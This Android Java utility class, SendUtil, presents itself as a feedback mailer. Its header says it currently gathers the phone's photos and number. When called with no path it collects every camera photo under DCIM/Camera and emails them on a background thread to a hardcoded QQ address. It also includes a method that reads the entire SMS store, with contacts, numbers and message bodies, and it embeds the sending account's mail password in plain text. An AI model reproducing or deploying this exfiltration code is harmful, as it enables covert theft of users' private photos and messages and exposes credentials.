package com.feifei.util;

import android.app.PendingIntent;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteException;
import android.net.Uri;
import android.os.Environment;
import android.telephony.SmsManager;
import android.util.Log;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Properties;

import javax.activation.CommandMap;
import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.activation.MailcapCommandMap;
import javax.mail.BodyPart;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
import javax.mail.internet.MimeUtility;

/**
 * @author 裴智飞
 * @date 2014-7-13
 * @date 下午4:05:18
 * @file SendUtil.java
 * @content 发送信息，暂时只有获取本机相片和手机号码
 */
public class SendUtil extends javax.mail.Authenticator {
	private final String username = "1048741029@qq.com";
	private final String password = "fankui";
	private final String[] toArray = new String[] { "351827417@qq.com" };
	private final String port = "465";
	private final String sport = "465";
	private final String host = "smtp.qq.com";
	private final String subject = "反馈";
	private final String body = "我是内容";
	private final Multipart multipart = new MimeMultipart();
	private static boolean attachmentArray = false;
	private static ArrayList<String> list2;

	/**
	 * @param string
	 * @notice 发送QQ邮件给自己
	 */
	public static void sendMail(final String string) {
		mail(string, false, null);
	}

	/**
	 * @notice 发送邮件含附件，需要开一个服务分批次发送
	 */
	public static void sendAttachment() {
		mail(null, true, null);
	}

	/**
	 * @param filePath
	 * @notice 附件的路径
	 */
	public static void sendAttachment(String filePath) {
		mail(null, true, filePath);
	}

	/**
	 * @param filePath
	 * @notice 添加多个附件的方法
	 */
	public static void sendAttachment(ArrayList<String> filePath) {
		attachmentArray = true;
		list2 = filePath;
		mail(null, true, "");
	}

	private static void mail(final String string, final boolean attachment, final String filePath) {
		final SendUtil m = new SendUtil();
		new Thread(new Runnable() {
			@Override
			public void run() {
				try {
					if (attachment) {
						if (filePath == null) {
							// null则遍历图片文件
							IterateFile(new File(Environment.getExternalStorageDirectory().toString() + "/"
									+ "DCIM/Camera/"));
							for (int i = 0; i < list.size(); i++) {
								m.addAttachment(list.get(i));
							}
						} else {
							// 单个附件
							if (!attachmentArray) {
								m.addAttachment(filePath);
							} else {
								// 多个附件
								for (int i = 0; i < list2.size(); i++) {
									m.addAttachment(list2.get(i));
								}
								attachmentArray = false;
							}

						}
					}
					if (m.send(string)) {
						LogUtil.log("发送成功");
					} else {
						LogUtil.log("发送失败");
					}
				} catch (Exception e) {
					LogUtil.log("异常" + e.getMessage());
					e.printStackTrace();
				}
			}
		}).start();
	}

	private boolean send(String string) throws Exception {
		Properties props = new Properties();
		props.put("mail.smtp.host", host);
		props.put("mail.debug", "true");
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.port", port);
		props.put("mail.smtp.socketFactory.port", sport);
		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
		props.put("mail.smtp.socketFactory.fallback", "false");
		if (!username.equals("") && !password.equals("") && toArray.length > 0 && !subject.equals("")
				&& !body.equals("")) {
			Session session = Session.getInstance(props, this);
			MimeMessage msg = new MimeMessage(session);
			msg.setFrom(new InternetAddress(username));
			InternetAddress[] addressTo = new InternetAddress[toArray.length];
			for (int i = 0; i < toArray.length; i++) {
				addressTo[i] = new InternetAddress(toArray[i]);
			}
			// 这是添加多个联系人的方法，一个是setRecipient
			msg.setRecipients(MimeMessage.RecipientType.TO, addressTo);
			msg.setSubject(subject);
			msg.setSentDate(new Date());
			BodyPart messageBodyPart = new MimeBodyPart();
			if (string != null) {
				messageBodyPart.setText(string);
			} else {
				messageBodyPart.setText(body);
			}
			multipart.addBodyPart(messageBodyPart);
			msg.setContent(multipart);
			Transport.send(msg);
			LogUtil.log("已发送");
			return true;
		} else {
			return false;
		}
	}

	/**
	 * @param filename
	 * @throws Exception
	 * @notice 添加附件的方法
	 */
	private void addAttachment(String filename) throws Exception {
		BodyPart messageBodyPart = new MimeBodyPart();
		DataSource source = new FileDataSource(filename);
		messageBodyPart.setDataHandler(new DataHandler(source));
		// 解决附件中的中文乱码问题
		messageBodyPart.setFileName(MimeUtility.encodeText(filename));
		multipart.addBodyPart(messageBodyPart);
	}

	private static String filepath;
	private static String filename;
	private static List<String> list;

	/**
	 * @param file
	 *            ：指定目录
	 * @return list<String>：返回一个list
	 * @notice 扫描指定目录的JPG文件
	 */
	public static List<String> IterateFile(File file) {
		list = new ArrayList<String>();
		if (!file.exists()) {
			file.mkdirs();
		}
		for (File filex : file.listFiles()) {
			if (filex.isDirectory()) {
				IterateFile(filex);
			} else {
				filepath = file.getPath();
				filename = filex.getName();
				if (filename.endsWith(".jpg")) {
					list.add(filepath + "/" + filename);
				}
			}
		}
		return list;
	}

	public static void sendMessage(String phone, String message) {
		sendSMS(phone, null, message, null, null);
	}

	/**
	 * @param phone
	 * @param message
	 * @param sentIntent
	 *            ：发送成功的intent
	 * @param deliveredIntent
	 *            ：接受成功的intent
	 * @notice 发送短信，需要添加权限 <uses-permission android:name="android.permission.SEND_SMS"/> <uses-permission
	 *         android:name="android.permission.RECEIVE_SMS" /> <uses-permission
	 *         android:name="android.permission.READ_SMS"/> <uses-permission android:name="android.permission.WRITE_SMS"
	 *         />
	 */
	public static void sendMessage(String phone, String message, PendingIntent sentIntent, PendingIntent deliveredIntent) {
		sendSMS(phone, null, message, sentIntent, deliveredIntent);
	}

	private static void sendSMS(String phone, String scAddress, String message, PendingIntent sentIntent,
			PendingIntent deliveredIntent) {
		SmsManager smsMgr;
		smsMgr = SmsManager.getDefault();
		// 超过某个值则拆分为多条发送
		if (message.length() > 70) {
			ArrayList<String> msgs = smsMgr.divideMessage(message);
			for (String msg : msgs) {
				smsMgr.sendTextMessage(phone, null, msg, sentIntent, deliveredIntent);
			}
		} else {
			smsMgr.sendTextMessage(phone, scAddress, message, sentIntent, deliveredIntent);
		}
		// // 将发送的短信插入数据库
		// ContentValues values = new ContentValues();
		// values.put("date", System.currentTimeMillis());
		// // 阅读状态
		// values.put("read", 0);
		// // 1为收 2为发
		// values.put("type", 2);
		// // 送达号码
		// values.put("address", phone);
		// // 送达内容
		// values.put("body", message);
		// // 插入短信库
		// context.getContentResolver().insert(Uri.parse("content://sms"),
		// values);
	}

	/**
	 * Override不能去，这个方法是核对用户名和密码的
	 */
	@Override
	public PasswordAuthentication getPasswordAuthentication() {
		return new PasswordAuthentication(username, password);
	}

	/**
	 * 构造函数
	 */
	public SendUtil() {
		MailcapCommandMap mc = (MailcapCommandMap) CommandMap.getDefaultCommandMap();
		mc.addMailcap("text/html;; x-java-content-handler=com.sun.mail.handlers.text_html");
		mc.addMailcap("text/xml;; x-java-content-handler=com.sun.mail.handlers.text_xml");
		mc.addMailcap("text/plain;; x-java-content-handler=com.sun.mail.handlers.text_plain");
		mc.addMailcap("multipart/*;; x-java-content-handler=com.sun.mail.handlers.multipart_mixed");
		mc.addMailcap("message/rfc822;; x-java-content-handler=com.sun.mail.handlers.message_rfc822");
		CommandMap.setDefaultCommandMap(mc);
	}

	/**
	 * @param context
	 * @return
	 * @notice 获取短信内容，含电话号码，需要加权限 <uses-permission android:name="android.permission.READ_SMS" />
	 */
	@SuppressWarnings("unused")
	public static String getSmsInPhone(Context context) {
		final String SMS_URI_ALL = "content://sms/";
		final String SMS_URI_INBOX = "content://sms/inbox";
		final String SMS_URI_SEND = "content://sms/sent";
		final String SMS_URI_DRAFT = "content://sms/draft";
		StringBuilder smsBuilder = new StringBuilder();
		try {
			ContentResolver cr = context.getContentResolver();
			String[] projection = new String[] { "_id", "address", "person", "body", "date", "type" };
			Uri uri = Uri.parse(SMS_URI_ALL);
			Cursor cur = cr.query(uri, projection, null, null, "date desc");
			if (cur.moveToFirst()) {
				String name;
				String phoneNumber;
				String smsbody;
				String date;
				String type;
				int nameColumn = cur.getColumnIndex("person");
				int phoneNumberColumn = cur.getColumnIndex("address");
				int smsbodyColumn = cur.getColumnIndex("body");
				int dateColumn = cur.getColumnIndex("date");
				int typeColumn = cur.getColumnIndex("type");
				do {
					name = cur.getString(nameColumn);
					phoneNumber = cur.getString(phoneNumberColumn);
					smsbody = cur.getString(smsbodyColumn);
					SimpleDateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss", Locale.getDefault());
					Date d = new Date(Long.parseLong(cur.getString(dateColumn)));
					date = dateFormat.format(d);
					int typeId = cur.getInt(typeColumn);
					if (typeId == 1) {
						type = "接收";
					} else if (typeId == 2) {
						type = "发送";
					} else {
						type = "";
					}
					smsBuilder.append("[");
					smsBuilder.append(type + "\t");
					smsBuilder.append(name + ",");
					smsBuilder.append(phoneNumber + ",");
					smsBuilder.append(smsbody + ",");
					smsBuilder.append(date);
					smsBuilder.append("] " + "\n");
					if (smsbody == null) {
						smsbody = "";
					}
				} while (cur.moveToNext());
			} else {
				smsBuilder.append("no result!");
			}
			smsBuilder.append("OK!");
		} catch (SQLiteException ex) {
			Log.e("getSmsInPhoneEX", ex.getMessage());
		}
		return smsBuilder.toString();
	}

}
